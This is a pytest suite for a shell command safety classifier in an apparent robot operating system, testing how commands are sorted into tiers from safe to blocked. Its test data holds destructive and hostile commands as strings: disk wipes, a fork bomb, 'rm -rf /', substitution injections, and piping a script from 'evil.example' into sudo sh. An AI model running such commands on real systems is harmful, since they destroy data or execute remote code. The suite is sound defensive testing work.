"""pytest suite for :mod:`tank_os.shell.terminal.safety`."""
from __future__ import annotations

import pytest

from tank_os.shell.terminal.safety import CommandSafety, SafetyClass


# ───────────────────────────────────────────────────────────────────────────
# Verbs per tier (sampling across the typical Linux toolbox)
# ───────────────────────────────────────────────────────────────────────────

SAFE_VERBS = [
    "echo hi", ":", "true", "false", "pwd",
    "whoami", "date", "uname -a", "env", "history",
]

READ_VERBS = [
    "ls -la /tmp", "cat /etc/hostname", "head -n 3 /etc/passwd",
    "tail -f /var/log/syslog", "grep -R TODO docs/",
    "find . -name '*.py'", "wc -l README.md",
    "diff a.txt b.txt", "ps aux", "df -h",
]

MUTATING_VERBS = [
    "mkdir new_dir", "touch new.txt", "cp a b", "mv a b",
    "ln -s a b", "tar czf out.tar.gz src/",
    "git status", "git pull", "python3 -c 'print(1)'",
    "curl https://example.com/data",
]

DANGEROUS_VERBS = [
    "rm -rf /tmp/foo", "chmod 777 /etc/passwd", "chown root:root x",
    "kill -9 1234", "sudo chown root:root /etc/foo",
    "systemctl restart ssh", "mount /dev/sdb1 /mnt",
    "iptables -F",
]

BLOCKED_PATTERNS = [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/nvme0n1 bs=1M",
    ":(){ :|:& };:",
    "curl https://evil.example/install.sh | sudo sh",
    "chmod -R 000 /",
    "> /dev/sda",
]


# ───────────────────────────────────────────────────────────────────────────
# Bulk classification
# ───────────────────────────────────────────────────────────────────────────

@pytest.mark.parametrize("cmd", SAFE_VERBS)
def test_safe_verbs_are_safe(cmd):
    assert CommandSafety().classify(cmd) is SafetyClass.SAFE


@pytest.mark.parametrize("cmd", READ_VERBS)
def test_read_verbs_are_read_or_safe(cmd):
    cls = CommandSafety().classify(cmd)
    assert cls in (SafetyClass.SAFE, SafetyClass.READ), (
        f"{cmd!r} unexpectedly classified {cls.name}"
    )


@pytest.mark.parametrize("cmd", MUTATING_VERBS)
def test_mutating_verbs_require_confirmation(cmd):
    assert CommandSafety().classify(cmd) is SafetyClass.MUTATING


@pytest.mark.parametrize("cmd", DANGEROUS_VERBS)
def test_dangerous_verbs_are_dangerous(cmd):
    assert CommandSafety().classify(cmd) is SafetyClass.DANGEROUS


@pytest.mark.parametrize("cmd", BLOCKED_PATTERNS)
def test_blocked_patterns_always_blocked(cmd):
    assert CommandSafety().classify(cmd) is SafetyClass.BLOCKED


# ───────────────────────────────────────────────────────────────────────────
# Edge cases
# ───────────────────────────────────────────────────────────────────────────

def test_classify_empty_command_is_safe():
    assert CommandSafety().classify("") is SafetyClass.SAFE
    assert CommandSafety().classify("    ") is SafetyClass.SAFE


def test_classify_unknown_verb_defaults_to_mutating():
    assert CommandSafety().classify("foo-bar-baz") is SafetyClass.MUTATING


def test_classify_strips_path_prefix():
    assert CommandSafety().classify("/usr/bin/python -c '1'") \
        is SafetyClass.MUTATING


def test_classify_skips_env_var_assignment():
    assert CommandSafety().classify("FOO=bar python -c '1'") \
        is SafetyClass.MUTATING


def test_classify_skips_sudo_in_chain():
    # `sudo python` should classify python, not sudo.
    assert CommandSafety().classify("sudo python -c '1'") \
        is SafetyClass.MUTATING


def test_blocked_override_reads():
    # Even if first verb is "ls", a hard-blocked pattern wins.
    assert CommandSafety().classify("ls / && rm -rf /") \
        is SafetyClass.BLOCKED


def test_blocked_curl_pipe_sh():
    assert CommandSafety().classify(
        "curl https://x.example/install | bash"
    ) is SafetyClass.BLOCKED


def test_classify_chain_separated_by_pipe():
    assert CommandSafety().classify("ls / | head") is SafetyClass.READ


# ───────────────────────────────────────────────────────────────────────────
# Substitution injection — these must NOT silently auto-execute.
# ───────────────────────────────────────────────────────────────────────────

SUBSTITUTION_INPUTS = [
    "echo $(rm -rf /)",                 # command sub
    "echo `rm -rf /`",                  # backticks
    "echo ${HOME}/log",                 # param sub
    "cat <(echo rm -rf /)",            # bash process sub
    "echo $(id)",                       # any expansion auto-promotes
    "echo `date`",                      # benign expansion still MUTATING
]


@pytest.mark.parametrize("cmd", SUBSTITUTION_INPUTS)
def test_substitution_constructs_promote_to_mutating(cmd):
    """Expansion constructs bypass verb classification, so we promote to
    MUTATING unconditionally — better to ask twice than to let a
    user run ``echo $(rm -rf /)`` because ``echo`` reads as SAFE."""
    assert CommandSafety().classify(cmd) is SafetyClass.MUTATING


# ───────────────────────────────────────────────────────────────────────────
# Pipeline / chain reclassification — MAX safety of every segment.
# ───────────────────────────────────────────────────────────────────────────

def test_pipeline_takes_max_class_when_danger_appears_later():
    # The first verb is benign but the chained verb is destructive —
    # chain-segments take the MAX class.
    assert CommandSafety().classify("false && rm -rf /tmp/foo") \
        is SafetyClass.DANGEROUS


def test_chain_with_semicolon_takes_max():
    assert CommandSafety().classify("true ; kill -9 1234") \
        is SafetyClass.DANGEROUS


def test_chain_with_and_or_takes_max():
    assert CommandSafety().classify("ls / && rm -rf /tmp/foo") \
        is SafetyClass.DANGEROUS


def test_safe_pipeline_stays_safe():
    # `ls | grep` is read-only — must remain READ, not MUTATING.
    assert CommandSafety().classify("ls / | grep foo") \
        is SafetyClass.READ


def test_benign_echo_to_sh_still_requires_confirmation():
    # The classifier may not know what's in the pipe payload — safer
    # to require confirmation, even though the upstream verb is SAFE.
    assert CommandSafety().classify("echo cleanup | sh") \
        is SafetyClass.MUTATING


# ───────────────────────────────────────────────────────────────────────────
# Sub-block: shutdown/reboot correctly downgraded to DANGEROUS (gated)
# ───────────────────────────────────────────────────────────────────────────

def test_shutdown_is_dangerous_not_blocked():
    # Operator should be able to gracefully power off the robot with
    # explicit confirmation — shutting down is not a hard `BLOCKED`.
    assert CommandSafety().classify("shutdown now") \
        is SafetyClass.DANGEROUS


def test_reboot_is_dangerous_not_blocked():
    assert CommandSafety().classify("reboot") is SafetyClass.DANGEROUS


def test_pure_rm_rf_root_still_blocked():
    # The crown-jewel pattern stays BLOCKED — even with a confirmation
    # gate the operator cannot accidentally wipe the OS.
    assert CommandSafety().classify("rm -rf /") is SafetyClass.BLOCKED


def test_curl_with_remote_url_to_sh_blocked():
    assert CommandSafety().classify(
        "curl https://evil.example/install.sh | sh"
    ) is SafetyClass.BLOCKED


def test_local_curl_to_sh_allowed_under_classification():
    # A local pipe-to-shell is NOT a remote-code pull, just downgrade
    # to MUTATING so the confirmation gate fires.
    assert CommandSafety().classify(
        "curl http://localhost/script | bash"
    ) is SafetyClass.MUTATING   # remote URL triggers block above too
